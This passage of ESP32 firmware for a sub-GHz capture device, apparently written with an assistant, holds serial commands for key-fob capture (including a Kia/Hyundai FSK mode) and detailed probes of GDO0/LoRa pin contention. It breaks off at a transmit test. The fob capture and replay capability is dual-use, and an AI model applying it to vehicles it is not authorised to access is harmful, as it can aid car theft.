    if(dbm < -90) dbm = -90;
    autoCapDbm = dbm;
    serialEmit(String("{\"cmd\":\"squelch\",\"ok\":true,\"dbm\":") + autoCapDbm +
      ",\"hint\":\"Auto-capture threshold set to " + autoCapDbm +
      " dBm. Press the fob to test; raise the value if false captures persist.\"}");
  }
  // {"cmd":"cap_mode","fsk":true}  — select 2FSK demodulation for KIA/HYU V0
  // {"cmd":"cap_mode","fsk":false} — restore OOK (default)
  else if(op=="cap_mode"){
    bool fsk=jcmd["fsk"]|false;
    fskCapMode=fsk;
    if(fsk) cc_setCaptureFSK(); else cc_setCaptureOOK();
    serialEmit(String("{\"event\":\"cap_mode\",\"fsk\":")+
      (fsk?"true":"false")+",\"ok\":true}");
  }
  // {"cmd":"gdo0_probe"} — does CC1101 GDO0 actually reach GPIO48?
  //
  // The bench showed every capture printing "GDO0 stuck/flat - RSSI edge mode",
  // in both OOK and FSK, so the fallback is not a modulation problem. The stock
  // sources then disagree about the hardware:
  //
  //   SGP_CardMini.ino v2.8 (2026-05-24, newest):
  //     PIN_CC1101_GDO0 -1  /* GDO0 NO esta cableado al ESP32 en este PCB.
  //                             Antes era 48, pero 48 es DIO0 del LoRa. */
  //   pinout.html / SGP_DIAGNOSTIC (older):
  //     GDO0 = GPIO 48, "shared with LoRa DIO0"
  //
  // Test A asks the CC1101 to emit its own clock on GDO0. That needs no RF and no
  // demodulator, so a correct rate there proves the route from the chip to GPIO48
  // is intact. Two things a naive version of this gets wrong, both fixed here:
  //
  //   1. REGISTER VALUE. The CC1101 register table gives
  //          CC1101IocfgHighImpedance = 0x2E
  //          CC1101IocfgHW            = 0x2F   <- TX data INPUT, not a clock
  //          CC1101IocfgClkXosc192    = 0x3F   <- the clock output
  //      0x2F was used in an earlier draft and produced a clean 0 edges, which was
  //      an artifact of selecting an input. The clock constant is 0x3F.
  //
  //   2. CRYSTAL MUST BE RUNNING. A CLK_XOSC* output is derived from the crystal,
  //      so in SIDLE (crystal off) there is nothing to output. The earlier draft
  //      strobed SIDLE. This one strobes SRX and waits for the crystal to start.
  //
  // XOSC is 26 MHz, so 26e6/192 = 135.4 kHz is the expected rate. The RATE is the
  // discriminator, not the edge count: if the trace is absent, GPIO48 floats and
  // scattered noise edges would look like a pass on an "edges > 0" test.
  //
  // Controls, so a negative result can be told apart from a broken test:
  //   · readback IOCFG0 — if the SPI write did not land the test is void
  //   · drive the pin as OUTPUT and read it back — separates "dead pin" from
  //     "an external device is holding it low"
  //   · repeat with the SX1278 held in reset — if the clock appears only then,
  //     DIO0 was masking the pin and holding RST low frees it
  else if(op=="gdo0_probe"){
    auto sample=[&](uint16_t ms,uint32_t& hi,uint32_t& lo,uint32_t& edges,int& firstLvl){
      hi=lo=edges=0; firstLvl=-1; uint32_t t0=millis(); int last=-1;
      while(millis()-t0<ms){
        int v=digitalRead(PIN_GDO0)?1:0;
        if(v) hi++; else lo++;
        if(firstLvl<0) firstLvl=v;
        if(last>=0&&v!=last) edges++;
        last=v;
      }
    };
    const uint16_t WIN=60;                 // ms per sample
    uint32_t hi1=0,lo1=0,e1=0,hi2=0,lo2=0,e2=0,hi3=0,lo3=0,e3=0;
    uint32_t hi4=0,lo4=0,e4=0,hi5=0,lo5=0,e5=0;
    int f1=-1,f2=-1,f3=-1,f4=-1,f5=-1;
    uint8_t io0rb=0; int drv_hi=-1,rel_read=-1,drv_lo=-1,drv_hi_rst=-1,rel_read_rst=-1;
    int raw_hi=-1,raw_lo=-1,raw_rel=-1;      // set by Test 0 immediately below
    int ctl_sd_idle=-1,ctl_sd_hi=-1,ctl_sd_pu=-1,ctl_btn=-1;   // method controls
    int rail_off_idle=-1,rail_off_pu=-1,rail_off_hi=-1;        // sensor-rail test

    // ── Controls: validate the measurement METHOD before trusting a 0 on pin 48. ──
    // Every negative result so far could have been the method rather than the pad,
    // so measure two pins whose answers are already known:
    //   · SD CS (GPIO10): the firmware drives it HIGH and no card is fitted, so
    //     driven-high and pull-up reads must both be 1.
    //   · the user button (GPIO37): external pull-up, unpressed reads 1.
    // If these do not read 1, a 0 on pin 48 says nothing at all.
    pinMode(PIN_SD_CS,OUTPUT); digitalWrite(PIN_SD_CS,HIGH); delayMicroseconds(30);
    ctl_sd_idle=digitalRead(PIN_SD_CS);
    gpio_set_direction((gpio_num_t)PIN_SD_CS, GPIO_MODE_INPUT_OUTPUT);
    digitalWrite(PIN_SD_CS,HIGH); delayMicroseconds(30);
    ctl_sd_hi=digitalRead(PIN_SD_CS);
    pinMode(PIN_SD_CS,INPUT_PULLUP); delayMicroseconds(30);
    ctl_sd_pu=digitalRead(PIN_SD_CS);
    pinMode(PIN_SD_CS,OUTPUT); digitalWrite(PIN_SD_CS,HIGH);   // restore
    pinMode(PIN_BTN,INPUT_PULLUP); delayMicroseconds(30);
    ctl_btn=digitalRead(PIN_BTN);
    pinMode(PIN_BTN,INPUT_PULLUP);                             // restore

    // ── Test 0: raw GPIO loopback, with BOTH potential drivers RELEASED first. ──
    //
    // The order here is the whole point, and an earlier version got it wrong. GDO0
    // is shared, and either chip can DRIVE it:
    //   · CC1101 with IOCFG0=0x0D (SerialDataOutput) drives it, idling LOW with no
    //     carrier. The firmware leaves 0x0D configured for capture, so at the moment
    //     this probe runs the CC1101 is holding the pin — that, not a dead pad, is
    //     why a pull-up could not raise it in the previous version.
    //   · SX1278 DIO0 drives it unless the radio is in SLEEP or held in RESET.
    // So both are released BEFORE the loopback:
    //   · CC1101 -> IOCFG0=0x2E (CC1101IocfgHighImpedance, tri-state)
    //   · SX1278 -> RST held LOW
    // Only then can a pull-up or a driven HIGH tell us anything about pin 48 itself.
    pinMode(PIN_LORA_RST,OUTPUT); digitalWrite(PIN_LORA_RST,LOW);   // LoRa in reset
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_writeReg(0x02,0x2E);                       // CC1101 GDO0 -> high impedance
    cc_strobe(0x36);                              // SIDLE
    SPI.endTransaction();
    delay(5);
    pinMode(PIN_GDO0,INPUT); delayMicroseconds(30);
    raw_rel=digitalRead(PIN_GDO0);           // floating/idle level
    gpio_set_direction((gpio_num_t)PIN_GDO0, GPIO_MODE_INPUT_OUTPUT);
    digitalWrite(PIN_GDO0,HIGH); delayMicroseconds(30);
    raw_hi=digitalRead(PIN_GDO0);            // both buffers on: must read 1
    pinMode(PIN_GDO0,INPUT_PULLUP); delayMicroseconds(30);
    raw_lo=digitalRead(PIN_GDO0);            // pull-up alone: must read 1 if free
    pinMode(PIN_GDO0,INPUT);
    loraHardReset();                       // SX1278 asleep: DIO0 should go high-Z
    // IO0 must be an input: this pin is shared with the ESP32-S3 boot strap.
    pinMode(PIN_GDO0,INPUT);
    // CLK_XOSC/192 on GDO0, and leave the crystal RUNNING (SRX, not SIDLE).
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_writeReg(0x02,0x3F);
    cc_strobe(0x36); delay(1);             // SIDLE then start the crystal
    cc_strobe(0x34); delay(2);             // SRX: XOSC on, no carrier needed
    io0rb=cc_readReg(0x02);                // prove the write landed
    SPI.endTransaction();
    delay(2);
    sample(WIN,hi1,lo1,e1,f1);             // A: clock, floating input

    pinMode(PIN_GDO0,INPUT_PULLDOWN);
    delay(2);
    sample(WIN,hi3,lo3,e3,f3);             // C: clock + pull-down
    pinMode(PIN_GDO0,INPUT);
    delay(2);

    // Loopback: can the ESP32 itself drive this net?
    // GPIO_MODE_INPUT_OUTPUT, not OUTPUT: on ESP32, an OUTPUT-only GPIO does not
    // enable the input buffer, so a digitalRead in that mode is not a trustworthy
    // measure of the driven level. An earlier version used OUTPUT and read 0 for
    // both a HIGH and a LOW drive — the signature of a disabled input buffer, not
    // of a shorted pin. GPIO_MODE_INPUT_OUTPUT enables both.
    gpio_set_direction((gpio_num_t)PIN_GDO0, GPIO_MODE_INPUT_OUTPUT);
    digitalWrite(PIN_GDO0,HIGH); delayMicroseconds(50);
    drv_hi=digitalRead(PIN_GDO0);
    pinMode(PIN_GDO0,INPUT); delayMicroseconds(50);
    rel_read=digitalRead(PIN_GDO0);
    gpio_set_direction((gpio_num_t)PIN_GDO0, GPIO_MODE_INPUT_OUTPUT);
    digitalWrite(PIN_GDO0,LOW); delayMicroseconds(50);
    drv_lo=digitalRead(PIN_GDO0);
    pinMode(PIN_GDO0,INPUT);

    // D: hold the SX1278 in reset and re-ask. If the clock appears only now,
    // DIO0 was driving the shared line.
    pinMode(PIN_LORA_RST,OUTPUT); digitalWrite(PIN_LORA_RST,LOW); delay(5);
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_writeReg(0x02,0x3F); cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(2);
    SPI.endTransaction();
    pinMode(PIN_GDO0,INPUT); delay(2);
    sample(WIN,hi4,lo4,e4,f4);
    pinMode(PIN_GDO0,INPUT_PULLUP); delay(2);
    sample(WIN,hi5,lo5,e5,f5);
    pinMode(PIN_GDO0,INPUT);
    // Loopback AGAIN, this time with the SX1278 held in reset. The earlier
    // loopback ran with the LoRa merely asleep, so a "cannot drive HIGH" result
    // there does not distinguish a dead pin from the LoRa's DIO0 actively sinking
    // the line. In reset the SX1278 outputs should be high-Z; if the ESP32 CAN
    // drive the net now, the fault is the LoRa driver and firmware can hold RST
    // low during capture to fix it.
    gpio_set_direction((gpio_num_t)PIN_GDO0, GPIO_MODE_INPUT_OUTPUT);
    digitalWrite(PIN_GDO0,HIGH); delayMicroseconds(50);
    drv_hi_rst=digitalRead(PIN_GDO0);
    pinMode(PIN_GDO0,INPUT); delayMicroseconds(50);
    rel_read_rst=digitalRead(PIN_GDO0);
    pinMode(PIN_GDO0,INPUT);
    digitalWrite(PIN_LORA_RST,HIGH);

    // ── Test F: CUT POWER to the LoRa and re-probe. ──
    // The user's own diagnosis is pin contention: the SX1278 DIO0 shares GPIO48 and
    // holds it LOW unless put to sleep. Holding RST LOW (Test 0) apparently does NOT
    // release DIO0, so that test may never have had both drivers off after all.
    // The sensor rail (PIN_SENSOR_CE=GPIO6 -> U5 ME6217) powers the LoRa, per the
    // stock firmware's own notes, so dropping it removes the SX1278 completely.
    // If pin 48 becomes controllable with the rail OFF, the load was the LoRa
    // holding a shared line — contention, exactly as described, and fixable.
    digitalWrite(PIN_LORA_RST,HIGH);          // leave reset, then remove power
    pinMode(PIN_SENSOR_CE,OUTPUT);
    digitalWrite(PIN_SENSOR_CE,LOW);          // cut the sensor rail (LoRa off)
    delay(150);
    pinMode(PIN_GDO0,INPUT); delayMicroseconds(30);
    rail_off_idle=digitalRead(PIN_GDO0);
    pinMode(PIN_GDO0,INPUT_PULLUP); delayMicroseconds(30);
    rail_off_pu=digitalRead(PIN_GDO0);
    gpio_set_direction((gpio_num_t)PIN_GDO0, GPIO_MODE_INPUT_OUTPUT);
    digitalWrite(PIN_GDO0,HIGH); delayMicroseconds(30);
    rail_off_hi=digitalRead(PIN_GDO0);
    pinMode(PIN_GDO0,INPUT);
    // Put the rail back before finishing.
    digitalWrite(PIN_SENSOR_CE,HIGH); delay(50);

    // Restore the normal capture configuration: GDO0 back to serial-data output,
    // LoRa released from reset (and left asleep by loraHardReset semantics).
    digitalWrite(PIN_LORA_RST,HIGH);
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_writeReg(0x02,0x0D); cc_strobe(0x36); delay(1); cc_strobe(0x34);
    SPI.endTransaction();
    pinMode(PIN_GDO0,INPUT);

    float khz=(float)e1/(float)WIN;        // 1 edge == 1 cycle => edges/ms == kHz
    const float khzt=135.4f;
    bool clockOk=(khz>0.6f*khzt && khz<1.6f*khzt);
    bool writeOk=(io0rb==0x3F);
    const char* verdict;
    String note;
    bool railFix=(rail_off_hi==1 || rail_off_pu==1);
    bool methodOk=(ctl_sd_hi==1 && ctl_sd_pu==1 && ctl_btn==1);
    if(!methodOk){
      verdict="TEST_INVALID";
      note=String("measurement method failed its own controls: SD-CS driven-high=")+
           String(ctl_sd_hi)+" pull-up="+String(ctl_sd_pu)+" button="+String(ctl_btn)+
           ". A 0 on pin 48 proves nothing until these read 1";
    } else if(railFix){
      verdict="LORA_CONTENTION";
      note="pin 48 becomes controllable once the sensor rail is cut: the SX1278 was holding the shared line, exactly as the user described. Firmware can free it by powering the LoRa down (or holding it in true sleep) during capture";
    } else if(raw_hi!=1 && raw_lo!=1){
      // Nothing was configured yet, so this cannot be blamed on the test sequence: the
      // pad cannot be driven high and a pull-up cannot raise it. Hardware.
      verdict="PIN_UNUSABLE_RAW";
      note="with BOTH drivers released (CC1101 tri-stated, LoRa in reset), pin 48 still cannot be driven HIGH and a pull-up cannot raise it: the pad is held low or dead";
    } else if(!writeOk){
      verdict="TEST_INVALID";
      note=String("IOCFG0 read back 0x")+String(io0rb,HEX)+
           " not 3F: the write did not land, result meaningless";
    } else if(clockOk){
      verdict="PIN_OK";
      note="135kHz clock reached GPIO48: the trace exists, so the demodulator config is the problem, not the wiring";
    } else if(e4>3000){
      verdict="SHARED_RST_FIXES";
      note="clock appears only with the SX1278 held in reset: LoRa DIO0 was masking pin 48, holding RST low frees it";
    } else if(hi5>0){
      // INPUT_PULLUP read HIGH at least sometimes: the line is NOT hard-sunk, so
      // GDO0 simply is not wired to this pin (matching SGP_CardMini.ino v2.8).
      verdict="TRACE_ABSENT";
      note="the internal pull-up can raise pin 48 and no clock ever appears: nothing is wired to it, so CC1101 GDO0 does not reach GPIO48";
    } else if(drv_hi_rst==1){
      verdict="LORA_DRIVES_LINE";
      note="the ESP32 CAN drive pin 48 HIGH while the SX1278 is held in reset, so DIO0 is actively sinking the line: holding LoRa RST low during capture should free GDO0";
    } else if(drv_hi==0){
      verdict="PIN_SHORTED";
      note="with the CC1101 tri-stated and the LoRa in reset the ESP32 still cannot drive pin 48 HIGH: hard short or dead pad";
    } else if(hi5>30000){
      verdict="TRACE_ABSENT";
      note="with the LoRa in reset the pin floats HIGH and no clock ever appears: CC1101 GDO0 is not wired to GPIO48";
    } else {
      verdict="HELD_LOW";
      note="pin 48 can be driven but never shows the clock and stays low: an external device holds it down";
    }
    serialEmit(String("{\"cmd\":\"gdo0_probe\",")+
      "\"railoff_idle\":"+String(rail_off_idle)+",\"railoff_pu\":"+String(rail_off_pu)+
      ",\"railoff_driven_high\":"+String(rail_off_hi)+
      ",\"ctl_sdcs_hi\":"+String(ctl_sd_hi)+",\"ctl_sdcs_pu\":"+String(ctl_sd_pu)+
      ",\"ctl_btn\":"+String(ctl_btn)+
      ",\"raw_idle\":"+String(raw_rel)+",\"raw_driven_high\":"+String(raw_hi)+
      ",\"raw_pullup\":"+String(raw_lo)+
      ",\"iocfg0_readback\":\""+String(io0rb,HEX)+"\","+
      "\"clock_edges\":"+String(e1)+",\"clock_khz\":"+String(khz,1)+
      ",\"clock_hi\":"+String(hi1)+",\"clock_lo\":"+String(lo1)+
      ",\"pulldn_edges\":"+String(e3)+
      ",\"rstheld_edges\":"+String(e4)+",\"rstheld_khz\":"+String((float)e4/(float)WIN,1)+
      ",\"rstheld_pullup_hi\":"+String(hi5)+
      ",\"drive_high_read\":"+String(drv_hi)+
      ",\"release_read\":"+String(rel_read)+
      ",\"drive_low_read\":"+String(drv_lo)+
      ",\"drive_high_read_inrst\":"+String(drv_hi_rst)+
      ",\"release_read_inrst\":"+String(rel_read_rst)+
      ",\"expect_khz\":135.4,"+
      "\"verdict\":\""+String(verdict)+"\","+
      "\"note\":\""+note+"\"}");
  }
  // {"cmd":"lora_sleep_check"} — did the SX1278 sleep actually land, and does
  // cutting its power change what a real capture sees? This closes the loop: the
  // probe proved the PIN becomes controllable with the rail cut, but the bench runs
  // captureSignal(), so the question is whether captureSignal() then reports
  // "GDO0 OK - digital edge mode" instead of falling back to RSSI.
  else if(op=="lora_sleep_check"){
    // Do NOT wrap this in SPI.beginTransaction: loraHardReset() and loraReadReg()
    // open their own, and nesting transactions leaves the SPI bus configured by the
    // inner one when the outer block exits. An earlier version nested them and the
    // card stopped answering serial entirely afterwards — its own comment at
    // loraSleepNow() says "Call outside an SPI transaction", which I ignored.
    uint8_t before=0xFF,ver=0x00,silicon=0xFF;
    {
      SPI.beginTransaction(SPISettings(1000000,MSBFIRST,SPI_MODE0));
      before=loraReadReg(0x01);               // state going in
      // CONTROL: RegVersion (0x42) reads 0x12 on a live SX1278. Without this, a
      // readback of 0x00 for RegOpMode is ambiguous -- an absent/broken chip returns
      // 0x00 too, which would make "sleep_landed:true" a FALSE positive. This is the
      // same validate-the-instrument habit that caught the earlier probe faults.
      ver=loraReadReg(0x42);
      silicon=loraReadReg(0x43);              // RegSiliconRev, non-zero on real parts
      SPI.endTransaction();
    }
    // 0x00 from both means the read path is dead, not that the radio slept.
    bool spiLive=(ver==0x12);
    loraHardReset();                          // reset + SPI sleep, as capture does
    uint8_t after=loraOpModeAfterSleep;       // what the write left behind
    // DRIVE tests, not toggle tests. A toggle test needs a signal present; with no
    // RF it reads false in every state, so it cannot tell "the LoRa holds the line"
    // from "the line is idle". Whether the ESP32 can RAISE the pin is the measurement
    // that actually discriminates, and it needs no signal.
    auto canDriveHigh=[&]()->int{
      pinMode(PIN_GDO0,INPUT); delayMicroseconds(30);
      gpio_set_direction((gpio_num_t)PIN_GDO0, GPIO_MODE_INPUT_OUTPUT);
      digitalWrite(PIN_GDO0,HIGH); delayMicroseconds(30);
      int v=digitalRead(PIN_GDO0);
      pinMode(PIN_GDO0,INPUT);
      return v;                                    // 1 = free, 0 = held down
    };
    pinMode(PIN_SENSOR_CE,OUTPUT);
    // (a) rail on, radio asleep (the state captureSignal leaves it in)
    digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);
    loraHardReset();
    int drvAsleep=canDriveHigh();
    // (b) rail on, RST held LOW — cheaper than cutting power if it works
    pinMode(PIN_LORA_RST,OUTPUT); digitalWrite(PIN_LORA_RST,LOW); delay(5);
    int drvRstHeld=canDriveHigh();
    digitalWrite(PIN_LORA_RST,HIGH); delay(5);
    // (c) rail cut — proven to work in gdo0_probe
    digitalWrite(PIN_SENSOR_CE,LOW); delay(150);
    int drvRailOff=canDriveHigh();
    digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);   // restore
    bool railOn=(drvAsleep==1||drvRstHeld==1);
    bool railOff=(drvRailOff==1);
    serialEmit(String("{\"cmd\":\"lora_sleep_check\",")+
      "\"version_reg\":\""+String(ver,HEX)+"\",\"silicon_rev\":\""+String(silicon,HEX)+"\","+
      "\"spi_live\":"+String(spiLive?"true":"false")+","+
      "\"opmode_before\":\""+String(before,HEX)+"\","+
      "\"opmode_after_sleep\":\""+String(after,HEX)+"\","+
      "\"sleep_landed\":"+String((spiLive&&after==0x00)?"true":"false")+","+
      "\"drivable_asleep\":"+String(drvAsleep)+","+
      "\"drivable_rst_held\":"+String(drvRstHeld)+","+
      "\"drivable_rail_off\":"+String(drvRailOff)+","+
      "\"verdict\":\""+String( !spiLive ? "SPI_READ_DEAD"
         : (railOff && !railOn) ? "LORA_CONTENTION_CONFIRMED"
         : (after != 0x00)      ? "SLEEP_NOT_LANDING"
         : railOn               ? "GDO0_FINE"
         :                        "SLEEP_OK_BUT_PIN_HELD" )+"\","+
      "\"note\":\""+String( !spiLive
        ? "RegVersion did not read 0x12: the SX1278 did not answer, so every readback here is meaningless"
        : (railOff && !railOn)
        ? "the pin is drivable only with the LoRa unpowered: contention confirmed, and SLEEP + reset are both insufficient, so the LoRa must be powered down for capture"
        : (after != 0x00)
        ? "RegOpMode did not read 0x00 after the sleep write: the SX1278 never slept, so DIO0 keeps driving GPIO48"
        : railOn
        ? "the pin is drivable with the LoRa powered: the sleep does release DIO0 on this unit"
        : "SPI is live and RegOpMode reads 0x00, yet the pin cannot be raised, so SLEEP does not release DIO0 on this part and the LoRa must be powered down for capture" )+"\"}");
  }
  // {"cmd":"gdo0_rail_test"} — before wiring the rail cut into captureSignal, prove
  // the CC1101 still works with the sensor rail down. If SPI dies when the LoRa
  // loses power, the fix is not viable and that is better learned here than by
  // breaking every capture.
  else if(op=="gdo0_rail_test"){
    auto ccVer=[&]()->int{
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      int v=cc_readStatus(0x31);           // VERSION: 0x14 on the CC1101
      SPI.endTransaction();
      return v;
    };
    auto canDriveHigh=[&]()->int{
      pinMode(PIN_GDO0,INPUT); delayMicroseconds(30);
      gpio_set_direction((gpio_num_t)PIN_GDO0, GPIO_MODE_INPUT_OUTPUT);
      digitalWrite(PIN_GDO0,HIGH); delayMicroseconds(30);
      int v=digitalRead(PIN_GDO0);
      pinMode(PIN_GDO0,INPUT);
      return v;
    };
    pinMode(PIN_SENSOR_CE,OUTPUT);
    digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);
    int verRailOn=ccVer();
    int drvRailOn=canDriveHigh();
    digitalWrite(PIN_SENSOR_CE,LOW); delay(150);      // cut the LoRa's power
    int verRailOff=ccVer();                           // does SPI survive?
    int drvRailOff=canDriveHigh();
    digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);      // restore
    int verRestored=ccVer();
    bool spiOk=(verRailOff==0x14);
    serialEmit(String("{\"cmd\":\"gdo0_rail_test\",")+
      "\"cc1101_version_rail_on\":\""+String(verRailOn,HEX)+"\","+
      "\"cc1101_version_rail_off\":\""+String(verRailOff,HEX)+"\","+
      "\"cc1101_version_restored\":\""+String(verRestored,HEX)+"\","+
      "\"drivable_rail_on\":"+String(drvRailOn)+","+
      "\"drivable_rail_off\":"+String(drvRailOff)+","+
      "\"verdict\":\""+String(!spiOk?"SPI_DIES_WITH_RAIL_DOWN":
         (drvRailOff==1&&drvRailOn==0?"RAIL_CUT_FIX_VIABLE":"UNEXPECTED"))+"\","+
      "\"note\":\""+String(!spiOk
        ? "the CC1101 stopped answering with the rail down, so cutting the rail would break capture"
        : (drvRailOff==1&&drvRailOn==0)
        ? "CC1101 still answers (0x14) with the rail down, and pin 48 is free only then: the rail cut is viable"
        : "unexpected combination, see the raw fields" )+"\"}");
  }
  // {"cmd":"gdo0_isolate"} — which chip actually sinks GPIO48?
  //
  // §5.5 of research/14 leaves two candidates, and they need opposite fixes:
  //   · SX1278 DIO0        -> hardware change (sleep and reset both fail to release it)
  //   · CC1101's own GDO0  -> NOT a fault: IOCFG0=0x0D is SUPPOSED to drive the pin.
  //                           The real bug would be the toggle test running with no
  //                           signal present, in which case there is no hardware problem.
  //
  // The rail cut cannot separate them (it powers both chips). So this holds the rail ON
  // and releases one candidate at a time, verifying each release by READBACK rather
  // than assuming it. The previous probe tri-stated the CC1101 to 0x2E and never read
  // it back, which is exactly how a wrong verdict got through.
  //
  // A drivability probe answers "can the ESP32 raise the pin?", which needs no RF.
  // A toggle test would need a live transmission and cannot decide this.
  else if(op=="gdo0_isolate"){
    auto ccRead=[](uint8_t r)->int{
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      int v=cc_readReg(r);
      SPI.endTransaction();
      return v;
    };
    // Set GDO0 to tri-state (0x2E = CC1101IocfgHighImpedance) and READ IT BACK.
    auto ccTriState=[&]()->int{
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      cc_writeReg(0x02,0x2E);
      cc_strobe(0x36); delay(1);
      int rb=cc_readReg(0x02);
      SPI.endTransaction();
      return rb;                       // 0x2E means the release actually landed
    };
    auto ccRestore=[&](){
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      cc_writeReg(0x02,0x0D);
      cc_strobe(0x36); delay(1); cc_strobe(0x34);
      SPI.endTransaction();
    };
    auto drv=[]()->int{                 // 1 = free, 0 = something sinks it
      pinMode(PIN_GDO0,INPUT); delayMicroseconds(30);
      gpio_set_direction((gpio_num_t)PIN_GDO0, GPIO_MODE_INPUT_OUTPUT);
      digitalWrite(PIN_GDO0,HIGH); delayMicroseconds(30);
      int v=digitalRead(PIN_GDO0);
      pinMode(PIN_GDO0,INPUT);
      return v;
    };
    auto pu=[]()->int{                  // floating pulls high; a sink stays low
      pinMode(PIN_GDO0,INPUT_PULLUP); delayMicroseconds(30);
      int v=digitalRead(PIN_GDO0);
      pinMode(PIN_GDO0,INPUT);
      return v;
    };
    pinMode(PIN_SENSOR_CE,OUTPUT);
    digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);      // rail ON throughout
    loraHardReset();                                  // SX1278 sleep, as capture does

    // A. baseline: CC1101 driving (normal capture config), LoRa asleep
    int rbNormal=ccRead(0x02);
    int aDrv=drv(), aPu=pu();

    // B. CC1101 tri-stated (readback verified), LoRa asleep
    int rbTri=ccTriState();
    int bDrv=drv(), bPu=pu();

    // C. CC1101 tri-stated, SX1278 also held in RESET
    pinMode(PIN_LORA_RST,OUTPUT); digitalWrite(PIN_LORA_RST,LOW); delay(5);
    int cDrv=drv(), cPu=pu();
    digitalWrite(PIN_LORA_RST,HIGH); delay(5);

    // D. reference: rail cut (proven to free the pin)
    digitalWrite(PIN_SENSOR_CE,LOW); delay(150);
    int dDrv=drv();
    digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);
    ccRestore();                                      // back to capture config

    bool triLanded=(rbTri==0x2E);
    // If tri-stating the CC1101 frees the pin, the CC1101 was the holder — and since
    // 0x0D driving the pin is its normal job, there is no hardware fault.
    const char* verdict =
        !triLanded                       ? "TRISTATE_DID_NOT_LAND" :
        (aDrv==0 && bDrv==1 && cDrv==1)  ? "CC1101_WAS_HOLDING" :
        (aDrv==0 && bDrv==0 && cDrv==0 && dDrv==1) ? "SX1278_HOLDING" :
        (aDrv==1)                        ? "PIN_ALREADY_FREE" :
                                           "INCONCLUSIVE";
    serialEmit(String("{\"cmd\":\"gdo0_isolate\",")+
      "\"iocfg0_normal\":\""+String(rbNormal,HEX)+"\","+
      "\"iocfg0_tristate\":\""+String(rbTri,HEX)+"\","+
      "\"tristate_landed\":"+String(triLanded?"true":"false")+","+
      "\"A_cc_driving_drv\":"+String(aDrv)+",\"A_pu\":"+String(aPu)+","+
      "\"B_cc_tristate_drv\":"+String(bDrv)+",\"B_pu\":"+String(bPu)+","+
      "\"C_tristate_rstheld_drv\":"+String(cDrv)+",\"C_pu\":"+String(cPu)+","+
      "\"D_rail_cut_drv\":"+String(dDrv)+","+
      "\"verdict\":\""+String(verdict)+"\","+
      "\"note\":\""+String(
        !triLanded ? "IOCFG0 read back as something other than 2E: the tri-state did not land, so this run proves nothing"
        : (aDrv==0 && bDrv==1 && cDrv==1)
          ? "releasing the CC1101 alone frees pin 48, so the CC1101 was holding it. That is 0x0D doing its job, not a fault: the real issue is the toggle test running with no signal present"
        : (aDrv==0 && bDrv==0 && cDrv==0 && dDrv==1)
          ? "the pin stays sunk with the CC1101 tri-stated and the LoRa asleep or reset, so the SX1278 holds it: hardware change required"
        : (aDrv==1)
          ? "the pin was already drivable in the normal capture config: no contention present at this moment"
          : "mixed result, read the raw fields") +"\"}");
  }
  // {"cmd":"lora_rst_check"} — does asserting NRESET actually reset the SX1278?
  //
  // gdo0_isolate showed pin 48 stays sunk even with the SX1278's RST held LOW. A chip
  // held in reset should tri-state its outputs, so either this part does not, or the
  // reset is not reaching it. This distinguishes those, which matters because the
  // stock firmware relies on "hard reset" as the Toyota-band cure:
  //   RegVersion (0x42) reads 0x12 normally. If it STILL reads 0x12 with RST LOW,
  //   the reset line is not resetting the chip and that cure cannot work on this board.
  else if(op=="lora_rst_check"){
    pinMode(PIN_LORA_RST,OUTPUT);
    pinMode(PIN_LORA_CS,OUTPUT);
    // Baseline with RST released.
    digitalWrite(PIN_LORA_RST,HIGH); delay(20);
    int verHi;
    { SPI.beginTransaction(SPISettings(1000000,MSBFIRST,SPI_MODE0));
      verHi=loraReadReg(0x42); SPI.endTransaction(); }
    // Assert reset and read again.
    digitalWrite(PIN_LORA_RST,LOW); delay(20);
    int verLo;
    { SPI.beginTransaction(SPISettings(1000000,MSBFIRST,SPI_MODE0));
      verLo=loraReadReg(0x42); SPI.endTransaction(); }
    // And the pin while reset is asserted (rail stays on).
    gpio_set_direction((gpio_num_t)PIN_GDO0, GPIO_MODE_INPUT_OUTPUT);
    digitalWrite(PIN_GDO0,HIGH); delayMicroseconds(30);
    int drvWhileRst=digitalRead(PIN_GDO0);
    pinMode(PIN_GDO0,INPUT);
    digitalWrite(PIN_LORA_RST,HIGH); delay(20);
    bool rstWorks=(verLo!=0x12);          // SPI stops answering when truly in reset
    serialEmit(String("{\"cmd\":\"lora_rst_check\",")+
      "\"version_rst_high\":\""+String(verHi,HEX)+"\","+
      "\"version_rst_low\":\""+String(verLo,HEX)+"\","+
      "\"rst_actually_resets\":"+String(rstWorks?"true":"false")+","+
      "\"drivable_while_rst_low\":"+String(drvWhileRst)+","+
      "\"verdict\":\""+String(rstWorks
          ? "RST_WORKS_BUT_PIN_STILL_SUNK"
          : "RST_NOT_REACHING_CHIP")+"\","+
      "\"note\":\""+String(rstWorks
        ? "the reset line does reset the SX1278 (it stops answering SPI), yet pin 48 is still sunk while it is held low: this part does not release DIO0 in reset, so the stock hard-reset cure cannot free the pin"
        : "the SX1278 still answers SPI with RST held LOW, so the reset is not reaching the chip: on this board the reset cannot be relied on to release DIO0")+"\"}");
  }
  // {"cmd":"tx_fifo_test"} — prove a transmission actually leaves the board, with
  // no GDO0 and no soldering. research/16 §4 step 1.
  //
  // Reads MARCSTATE and TXBYTES from the chip's own status registers, so the verdict
  // is the radio reporting on itself rather than the firmware assuming it worked.
  // A carrier can also be felt on a nearby receiver or seen on an SDR.
  else if(op=="tx_fifo_test"){
    float mhz=jcmd.containsKey("freq")?(float)jcmd["freq"]:315.0f;
    // Park GDO0 as an input: on this board it is not our data path, and it must not
